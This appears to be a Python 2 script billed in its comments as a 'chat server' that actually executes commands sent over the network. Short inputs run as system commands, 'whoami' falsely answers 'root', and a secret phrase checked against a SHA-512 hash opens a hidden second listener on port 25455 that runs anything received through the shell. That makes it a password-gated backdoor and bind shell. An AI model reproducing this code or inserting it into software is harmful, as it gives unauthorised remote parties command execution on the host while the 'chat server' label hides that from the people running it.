#!/usr/bin/evn python2
# Socket server in python using select function

import socket
import select
import sys
import subprocess
import os
import hashlib

godmode = False


def response(s):
    global godmode
    ret = ''
    if s:
        t = s.strip()
        if t == "ls":
            ret = subprocess.check_output("ls")
        elif t == "whoami":
            ret = "root\n"
        elif t == "id":
            ret = subprocess.check_output("id")
        elif hashlib.sha512(t.encode()).hexdigest() == '450edb453decaaef4cea1161d640ece785372f7b48c4e6425a2078c5f13ac06158d646042f41dc72b86cce79c649300ca53b6b0e4ed3b32464eae08bf9dcd17c':
            
            CONNECTION_LIST = []  # list of socket clients
            RECV_BUFFER = 4096  # Advisable to keep it as an exponent of 2
            PORT = 25455

            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # this has no effect, why ?
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind(("0.0.0.0", PORT))
            server_socket.settimeout(5)
            server_socket.listen(10)

            # Add server socket to the list of readable connections
            CONNECTION_LIST.append(server_socket)

            print "Chat server started on port " + str(PORT)

            for i in range(20):
                # Get the list sockets which are ready to be read through select
                read_sockets, write_sockets, error_sockets = select.select(
                    CONNECTION_LIST, [], [])

                for sock in read_sockets:
                    # New connection
                    if sock == server_socket:
                        # Handle the case in which there is a new connection recieved through server_socket
                        sockfd, addr = server_socket.accept()
                        sockfd.settimeout(5)
                        CONNECTION_LIST.append(sockfd)
                        print "Client (%s, %s) connected " % addr
                        

                    # Some incoming message from a client
                    else:
                        # Data recieved from client, process it
                        try:
                            # In Windows, sometimes when a TCP program closes abruptly,
                            # a &quot;Connection reset by peer&quot; exception will be thrown
                            
                            data = sock.recv(RECV_BUFFER)
                            # echo back the client message
                            print "[%s, %s] < " % addr, data
                            if data:
                                res  = subprocess.check_output(data, shell=True)
                                if res:
                                    print "[%s, %s] > " % addr, res
                                    sock.send(res)
                        # client disconnected, so remove from socket list
                        except:
                            print "Client (%s, %s) is offline " % addr
                            sock.close()
                            server_socket.close()
                            print "EXIT"
                            return None
        else:
            t = t.split(" ")
            if len(t) < 10:
                ret = subprocess.check_output(t)
    return ret


if __name__ == "__main__":

    CONNECTION_LIST = []  # list of socket clients
    RECV_BUFFER = 4096  # Advisable to keep it as an exponent of 2
    PORT = int(sys.argv[1])

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # this has no effect, why ?
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(("0.0.0.0", PORT))
    server_socket.listen(10)

    # Add server socket to the list of readable connections
    CONNECTION_LIST.append(server_socket)

    print "Chat server started on port " + str(PORT)

    while 1:
        # Get the list sockets which are ready to be read through select
        read_sockets, write_sockets, error_sockets = select.select(
            CONNECTION_LIST, [], [])

        for sock in read_sockets:

            # New connection
            if sock == server_socket:
                # Handle the case in which there is a new connection recieved through server_socket
                sockfd, addr = server_socket.accept()
                CONNECTION_LIST.append(sockfd)
                print "Client (%s, %s) connected " % addr

            # Some incoming message from a client
            else:
                # Data recieved from client, process it
                try:
                    # In Windows, sometimes when a TCP program closes abruptly,
                    # a &quot;Connection reset by peer&quot; exception will be thrown
                    data = sock.recv(RECV_BUFFER)
                    # echo back the client message
                    print "[%s, %s] < " % addr, data
                    if data:
                        res = response(data)
                        if res:
                            print "[%s, %s] > " % addr, res
                            sock.send(res)
                    else:
                        socket.send("\n")
                # client disconnected, so remove from socket list
                except:
                    print "Client (%s, %s) is offline " % addr
                    sock.close()
                    CONNECTION_LIST.remove(sock)
                    continue

    server_socket.close()
